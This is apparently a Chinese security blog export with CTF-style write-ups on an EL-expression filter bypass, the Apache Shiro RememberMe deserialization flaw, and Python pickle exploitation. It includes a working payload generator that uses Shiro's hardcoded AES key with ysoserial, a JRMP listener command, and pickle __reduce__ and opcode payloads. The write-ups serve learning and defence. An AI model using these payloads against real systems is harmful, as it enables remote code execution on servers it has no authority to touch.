src="https://i.loli.net/2021/02/11/MkgxTNb5lZdnpiX.png"></p><p>重点在<code>StateMethodExpressionWrapper#invoke</code>，它先用<code>MethodExpressionImpl</code>调用invoke，如果报错，就会进入<code>this.baseObjectExpression.getValue(context)</code>即<code>VauleExpressionImpl</code>的<code>GetValue</code>.（我们绕过正则的点就在这了<img src="https://i.loli.net/2021/02/11/qEa9YlVDcTAjwvJ.png"></p><p>先看正常的el表达式执行的点</p><p>在<code>AstValue#invoke</code>,调用了<code>AstValue#GetTarget</code></p><p><img src="https://i.loli.net/2021/02/13/VeK9HaCYtOSIuQA.png"></p><p><code>AstValue#GetTarget</code>,在这里获取了第一个对象，然后在<code>AstPropertySuffix#invoke</code>执行了方法<img src="https://i.loli.net/2021/02/13/JeOMlozrYDyZEmb.png"></p><p>可是上面的点执行点有过滤,过滤了左括号和getClass,导致这个点无法利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!Pattern.matches(<span class="hljs-string">&quot;[^\\\\(]*&quot;</span>, expr) || Pattern.matches(<span class="hljs-string">&quot;.*getClass.*&quot;</span>, expr)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;not allowd execute.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h4><p>在上面一连串的<code>invoke</code>中，有一个invoke方法</p><p><code>StateMethodExpressionWrapper#invoke</code>,当<code>MethodExpressImpl#invoke</code>爆出<code>MethodNotFoundException</code>时，就会调用<code>ValueExpressImpl#getValue</code>,它其实也会执行el表达式</p><p><img src="https://i.loli.net/2021/02/13/SZhNOk1egRvM5jc.png"></p><p>getValue的EL表达式执行点在这</p><p><img src="https://i.loli.net/2021/02/13/ftO5TIwhr7VBuvC.png"></p><p>于是，破局的方法就是，设法让<code>MethodExpressImpl#invoke</code>爆错，然后进入<code>ValueExpressImpl#getValue</code>,这样就能即绕过了过滤，也执行了el表达式</p><p>exp就是上面的了</p><p>参考</p><p><a href="https://paper.seebug.org/766/">https://paper.seebug.org/766/</a></p><p><a href="https://www.anquanke.com/post/id/170780#h2-1">https://www.anquanke.com/post/id/170780#h2-1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java题目</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化题目-强网杯 2018 彩蛋</title>
    <link href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-%E5%BD%A9%E8%9B%8B/"/>
    <url>/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-%E5%BD%A9%E8%9B%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA反序列化题目-强网杯-2018-彩蛋"><a href="#JAVA反序列化题目-强网杯-2018-彩蛋" class="headerlink" title="JAVA反序列化题目-强网杯 2018 彩蛋"></a>JAVA反序列化题目-强网杯 2018 彩蛋</h1><h2 id="Shiro漏洞说明"><a href="#Shiro漏洞说明" class="headerlink" title="Shiro漏洞说明"></a>Shiro漏洞说明</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在Apache Shiro &lt;= 1.2.4版本中存在反序列化漏洞。</p><blockquote><p>Shiro会以header中cookie的一个值Remember Me来进行对未经过身份验证(没有账号密码)的用户进行验证</p><p>Remember Me的值会经过以下操作</p><p>1.base64decode</p><p>2.AES解密</p><p>3.反序列化</p></blockquote><p>可以看到其最后一个操作是反序列化，那么如果我们能获得AES的密钥，就能生成任意的反序列化序列，进而利用shiro里的第三方库（如commons-collections3.2.1)形成任意代码执行。而在shiro&lt;=1.2.4以前，<strong>AES的密钥是硬编码存在配置文件中</strong>,从而就形成了这个漏洞</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境搭建在网上有很多教程，就不贴了</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>先获取rememberMe</p><p><img src="https://i.loli.net/2021/02/03/eUndgiSHsmLQMCr.png"></p><p>vps运行yeoserial.JRMPListener</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> ysoserial<span class="hljs-literal">-0</span>.<span class="hljs-number">0.6</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">7521</span> CommonsCollections7 calc.exe<br></code></pre></td></tr></table></figure><p>然后生成payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pip install pycrypto</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS   = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key  =  <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode =  AES.MODE_CBC<br>    iv   =  uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])    <br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/03/kc3jnhJeyBHL6Nz.png"></p><p>直接放在rememberMe字段中，重新发包，成功弹出计算器</p><p><img src="https://i.loli.net/2021/02/03/WzCVYcJReM5X7lb.png"></p><p>可以看到漏洞触发的调用栈</p><p><img src="https://i.loli.net/2021/02/03/EPmFjxICKRGh689.png"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据刚才的调用栈定位到<code>org.apache.shiro.mgt.AbstractRememberMeManager.deserialize</code>，打下断点</p><p><img src="https://i.loli.net/2021/02/03/H2XOZ4MQkCs5lnR.png"></p><p>回退到<code>AbstractRememberMeManager#getRememberedPrincipals</code>，他先调<code>AbstractRememberMeManager#getRememberedSerializedIdentity</code></p><p><img src="https://i.loli.net/2021/02/03/6oFe7aMpzvZHdEA.png"></p><p><code>AbstractRememberMeManager#getRememberedSerializedIdentity</code>,它会获取cookie中的值，然后进行base64解码<img src="C:\Users\劳锦伦\AppData\Roaming\Typora\typora-user-images\image-20210203163331232.png" alt="image-20210203163331232"></p><p>回到<code>AbstractRememberMeManager#getRememberedPrincipals</code>，调用<code>AbstractRememberMeManager#convertBytesToPrincipals</code>,用<code>decrypt</code>解密数组，然后就丢进<code>deserialize</code>.</p><p><strong>PS:这里的加密算法就是AES，他是对称加密算法，由于它把密钥写在了代码中，因此我们获取了密钥后，用该密钥加密我们的payload,就能正常解密</strong></p><p><img src="https://i.loli.net/2021/02/03/BZmhvbfQNeDJTMo.png"></p><p><code>AbstractRememberMeManager#deserialize</code>，调用<code>DefaultSerializer#deserialize</code></p><p><img src="https://i.loli.net/2021/02/03/uKaxVYrLHhBNXDA.png"></p><p><code>DefaultSerializer#deserialize</code>，这里与正常的反序列化不同的地方是<code>ObjectInputStream</code>，是一个shiro自己实现的类<code>ClassResolvingObjectInputStream</code>，它继承于<code>ObjectInputStream</code></p><p><img src="https://i.loli.net/2021/02/03/ynvSg95pKhGF81J.png"></p><p><code>ClassResolvingObjectInputStream</code>,它里面也很简单，就重写了<code>resolveClass</code>,它写了个ClassUtils用于加载类(<strong>这是个坑点，要好好研究</strong>)</p><p><img src="https://i.loli.net/2021/02/03/7XLspiBDlHPgOvN.png"></p><p>正常的<code>resolveClass</code></p><p><img src="https://i.loli.net/2021/02/03/PCLi4nFAjcE1rf7.png"></p><p>后面就是正常的<code>rmi注册中心打rmi客户端了</code>。我们传的payload就是<code>ysoserial.payload.JRMPClient</code>。当它被反序列化后会向指定的rmi注册中心请求，然后rmi注册中心(vps)控制报错信息返回<code>CommonsCollections5</code>的payload，然后<code>rmi客户端</code>又将报错信息反序列化，此时就攻击成功了。</p><h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><h4 id="1-Commons-Collections版本问题"><a href="#1-Commons-Collections版本问题" class="headerlink" title="1.Commons-Collections版本问题"></a>1.Commons-Collections版本问题</h4><p>网上有些文章中测试漏洞时用了<code>ysoserial.payload.CommonsCollections2</code>的payload,因为他们把shiro中的<code>CommonsCollections</code>改成了4.0版本，但是shiro中<code>CommmonsCollections</code>的默认版本是<code>3.2.1</code>，因此默认是不能用<code>ysoserial.payload.CommonsCollections2</code>的payload</p><h4 id="2-添加pom-xml问题"><a href="#2-添加pom-xml问题" class="headerlink" title="2.添加pom.xml问题"></a>2.添加pom.xml问题</h4><p><img src="https://i.loli.net/2021/02/03/2olbkzdCYw7uvOy.png"></p><p>由于shiro中本来就存在Commons-Collections:3.2.1，所以我就没有在pom.xml中再添加Commons-Collections，但是这样带来了一个问题，就是用上述的payload打时可以看到rmi客户端请求了rmi注册中心，rmi注册中心也返回了payload。rmi客户端也反序列化了payload，但是死活就是无法弹出计算器，通过一顿调试，终于发现当它反序列化Commons-Collections中的类时就会爆出<code>ClassnotFound</code>错误，估计就是没添加Commons-Collections的原因</p><p>因此虽然shiro里已经存在Commons-Collections:3.2.1，但是仍然在<code>Pom.xml</code>中添加它，这样才能成功利用</p><p><img src="https://i.loli.net/2021/02/03/MFfxqAkuzl1UBtd.png"></p><h4 id="3-关于为何不直接用CommonsCollections5的问题"><a href="#3-关于为何不直接用CommonsCollections5的问题" class="headerlink" title="3.关于为何不直接用CommonsCollections5的问题"></a>3.关于为何不直接用CommonsCollections5的问题</h4><p>这个问题本来根据网上的说法<code>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class</code>，就已经解决了问题（懒，不想去调试。但是最近又看到了一篇的文章，里面说了另外的一个原因，突然就困惑起来了，感觉可以好好研究研究 。</p><p>暂时觉得两者都有道理</p><p>如果不再tomcat环境下用<code>ClassResolvingObjectInputStream</code>,确实是因为<code>Class.loadClass不能加载原生类型和数组类型</code>而无法加载<code>Transformer[]</code>，因此此时连<code>java.lang.StackTraceElement[]</code>也无法加载。但是当在tomcat环境中时，就是由于Tomcat<code>和</code>JDK<code>的</code>Classpath<code>是不公用且不同的，</code>Tomcat<code>启动时，不会用</code>JDK<code>的</code>Classpath，而导致没有找到<code>Transformer[]</code></p><p>不过还有个问题，要是这样的话，那为什么不是<code>Transformer[]</code>的<code>commonscollections</code>类却能被加载呢？</p><p>解答：</p><p>在<code>Webappclassloader#ClassLoader</code>中，它会经行多次的loadclass操作，直到所有的方式都失败才会返回<code>ClassNotFound</code>，而前面几个方式用的都是<code>Class.loadClass</code>,因此无法加载数组，最后一个方式调用的是<code>Class.forName</code>,按理说数组也是可以加载的。那么通过多次调试，最终的结论就是：</p><p>在<code>Class.forName</code>前，会查找本地仓库，但是由于它不会像<code>Class.forName</code>一样对path进行处理，导致数组传进去的path有问题，就无法通过这里加载了，但是其他的类，比如<code>org.apache.commons.collections.functors.ChainedTransformer</code>,还是可以正常在本地仓库上找到的，可以看到<code>ChainedTransformer</code>从这里返回</p><p><img src="https://i.loli.net/2021/02/04/YmnkcGPBq8fwt47.png"></p><p>而<code>[Lorg.apache.commons.collections.Transformer;</code>在这一步变成了<code>/[Lorg/apache/commons/collections/Transformer;.class</code>，这怎么可能找得到类</p><p><img src="https://i.loli.net/2021/02/04/UTPOqI4y8lw1kYt.png"></p><p>最后一处调用<code>Class.forName</code>,loader为<code>URLClassLoader</code></p><p><img src="https://i.loli.net/2021/02/04/iWXF7ZEJfSw5V6N.png"></p><p>进到loadClass函数后可以看到类名被正确解析了,进到findClass，进而到<code>URLClassPath#getResource</code>中</p><p><img src="https://i.loli.net/2021/02/04/P5niG7jMcUat9dW.png"></p><p><code>URLClassPath#getResource</code>，我仔细看了看path,都是在tomcat环境里的jar path</p><p><img src="https://i.loli.net/2021/02/04/zfZe4BS9EMWvOPK.png"></p><p><img src="https://i.loli.net/2021/02/04/JWcVMKgF61t3kbZ.png"></p><p>那么找不到<code>Lorg.apache.commons.collections.Transformer</code>就不奇怪了，因此他就不能用<code>CommonsCollections5</code></p><p>对于直接用<code>ClassResolvingObjectInputStream</code>替换<code>ObjectInputStream</code>，反序列化CC5链,也不能成功反序列化的原因是由于<code>ClassUtils#loadClass</code>获取的<code>ClassLoader</code>为<code>AppClassLoader</code>而不是上面的<code>WebappClassloader</code>,自然就不会调用到<code>Class.forName</code>,也就无法加载数组了</p><p><img src="https://i.loli.net/2021/02/04/GPn39kbhtlQxfAd.png"></p><p>可以看到这里连<code>java.lang.StackTraceElement</code>都无法加载</p><p><img src="https://i.loli.net/2021/02/04/jbZItUSvCJeiEFn.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.shiro.test;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.apache.shiro.io.ClassResolvingObjectInputStream;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> sun.rmi.transport.LiveRef;<br><span class="hljs-keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jrmpclient</span> </span>&#123;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;D:\\ysoserial-master\\Output\\cc5.bin&quot;</span>);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ClassResolvingObjectInputStream(fis);<br>        ois.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>自此，Shiro反序列化就算完成了，学到了很多（调试使我快乐</p><p>参考</p><p><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p><p><a href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91">http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java题目</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python反序列化学习</title>
    <link href="/2020/06/07/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/06/07/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>python的序列化和反序列化主要有两个模块，json和pickle模块</p><p>json：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json <br><br>a = &#123;<span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;kobe&#x27;</span>&#125;<br>s = json.dumps(a)<br>print(s)<br>b = json.loads(s)<br>print(b)<br><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/07/Bpn4e9hFQLk6jvP.png"></p><p>pickle:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-comment">#a = &#x27;test,test,test&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.name = <span class="hljs-string">&#x27;kobe&#x27;</span><br>a = test()<br>s = pickle.dumps(a,protocol = <span class="hljs-number">3</span>)<br>print(s)<br>b = pickle.loads(s)<br>print(b.name)<br><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/07/PaKMviqjp4JUTRb.png"></p><p>可以看到，使用pickle序列化后的结果，不像json那样可读了，这是可以用上pickle的调节器 pickeletools.</p><p>pickletools有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。对应的方法是 dis()和optimize()<img src="https://i.loli.net/2020/06/07/4BICVZ2a6kmGHg3.png"></p><p>调用pickle.dumps()，里面的第二参数protocol代表协议，pickle支持4个协议，其中0号协议是人能看懂的协议，其他的协议对序列化进行了优化，也使序列化后的结果不再可读（默认使用3号协议）</p><p>下面使用3号协议，分析一下序列化后，字串里的内容的含义。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>打开python里pickle.py，看一下源码</p><p>先看看调用的方法 dump和load(文件) dumps和loads()</p><p><img src="https://i.loli.net/2020/06/07/ZaoqlCS5KyMOdTD.png"></p><p>可以看到都是调用了__Pickler类的dump和load方法。</p><p>再看看序列化后各字符的含义（太长，只截一部分）</p><p><img src="https://i.loli.net/2020/06/07/VAymbteLs1f3GSj.png"></p><p>我们使用pickletools把上面序列化的结果作简化后试着分析一下。</p><p><img src="https://i.loli.net/2020/06/07/4BICVZ2a6kmGHg3.png"></p><p>\x80：2号协议引入的东西，表示使用的协议号，这里是3号协议，因此写着3</p><p>c :  读取两个字符串（用\n分割）分别表示moudle和name,使用的是find_class(moudle,name)方法</p><p>) : 把一个空tuple压入栈</p><p>\x81 : 弹出栈中的tuple和class,使用cls.__new__(cls,*args),实例化一个类对象,再把结果压入栈</p><p>} : 把一个空dict压入栈</p><p>( : 将当前栈的内容放入前序栈中.   {前序栈保存了程序运行至今的（不在顶层的）完整的栈信息，而当前栈专注于处 理顶层的事件.}</p><p>X : 读取UTF-8字符串，以\n为结束</p><p>u : 将当前栈的内容存在一个数组里，将前序栈的内容拿出，恢复当前栈</p><p>s : 将刚才的数组里的内容以 key : value的方式，赋给栈顶的dict</p><p>b : 调用 __setstate__ or__dict__.update()</p><p>. : 结束</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a>__reduce__</h3><ul><li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li><li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li><li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li></ul><p>测试:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#a = &#x27;test,test,test&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.name = &#123;<span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;kobe&#x27;</span>,<span class="hljs-string">&#x27;points&#x27;</span>:<span class="hljs-string">&#x27;81&#x27;</span>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;whoami&#x27;</span>,))<br><br>a = test()<br>s = pickle.dumps(a)<br>s = pickletools.optimize(s)<br>print(s)<br>b = pickle.loads(s)<br><br></code></pre></td></tr></table></figure><p>成功执行了whoami(这里无论本来的类中是否存在__reduce__方法都会执行)</p><p><img src="https://i.loli.net/2020/06/07/k9hjz48A1WmBOn2.png"></p><h2 id="0x04-绕过-reduce-限制"><a href="#0x04-绕过-reduce-限制" class="headerlink" title="0x04 绕过__reduce__限制"></a>0x04 绕过__reduce__限制</h2><h4 id="1-使用黑名单限制可执行的函数"><a href="#1-使用黑名单限制可执行的函数" class="headerlink" title="1)使用黑名单限制可执行的函数"></a>1)使用黑名单限制可执行的函数</h4><p>这种限制往往不会有很好的效果，因为一不小心就会有漏网之鱼可以利用。</p><p>常见的绕过是使用map() 但是似乎python3 map()返回的是迭代器，还要使用next()才能得到结果，不知道怎么利用了。</p><h4 id="2-直接过滤了R"><a href="#2-直接过滤了R" class="headerlink" title="2) 直接过滤了R"></a>2) 直接过滤了R</h4><p>__reduce__完全不能使用了，需要想其他的方法利用</p><h5 id="c-指令码的妙用"><a href="#c-指令码的妙用" class="headerlink" title="c 指令码的妙用"></a>c 指令码的妙用</h5><p>问题假设： 有两个字符串 name和points 用户无法得知内容，先要求我们传进的内容反序列后的值要和设定好的name和points相同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle <br><span class="hljs-keyword">import</span> base64<br><br>secrte_name = <span class="hljs-string">&#x27;kobe&#x27;</span><br>secrte_points = <span class="hljs-string">&#x27;81&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">player</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name,points</span>):</span><br>        self.name = name<br>        self.points = points<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self,other</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> player <span class="hljs-keyword">and</span> self.name ==other.name <span class="hljs-keyword">and</span> self.points == other.points<br><br>print(pickle.dumps(player(secrte_name,secrte_points)))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">data</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no no no&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        x = pickle.loads(data)<br>        <span class="hljs-keyword">if</span>(x !=player(secrte_name,secrte_points)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wrong&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;you got me&quot;</span><br><br><br><br>print(check(base64.b64decode(<span class="hljs-built_in">input</span>())))<br><br></code></pre></td></tr></table></figure><p>解法：</p><p>利用c指令码，获取全局参数，从而得到secrte值（过程中我们并不知道secrte的值）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;\x80\x03c__main__\nplayer\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x05\x00\x00\x00curryq\x04X\x06\x00\x00\x00pointsq\x05X\x02\x00\x00\x0060q\x06ub.&#x27;<br></code></pre></td></tr></table></figure><p>替换成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;\x80\x03c__main__\nplayer\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03c__main__\nsecrte_name\nq\x04X\x06\x00\x00\x00pointsq\x05c__main__\npoints\nq\x06ub.&#x27;<br></code></pre></td></tr></table></figure><p>base64加密后传进去</p><p><img src="C:\Users\劳锦伦\AppData\Roaming\Typora\typora-user-images\image-20200607163017640.png" alt="image-20200607163017640"></p><h4 id="3-绕过c指令限制"><a href="#3-绕过c指令限制" class="headerlink" title="3)绕过c指令限制"></a>3)绕过c指令限制</h4><p>前面说过，c指令调用的是find_class函数，若这个函数被改了只能读取某些module时，该怎么利用呢？</p><p>答案是先读入，后篡改 </p><p>先利用一段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;c__main__\nplay\n&#125;(Vname\nVcurry\nVpoints\nV60\nub0&#x27;<br></code></pre></td></tr></table></figure><p>读入我们设定好的值，再反序列化后，原本play.name和play.points就改成了我们想要的值。最后的0是将该dict弹出栈，这样后面的操作就不会应该到这一段了。</p><p>后面就是正常的反序列化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 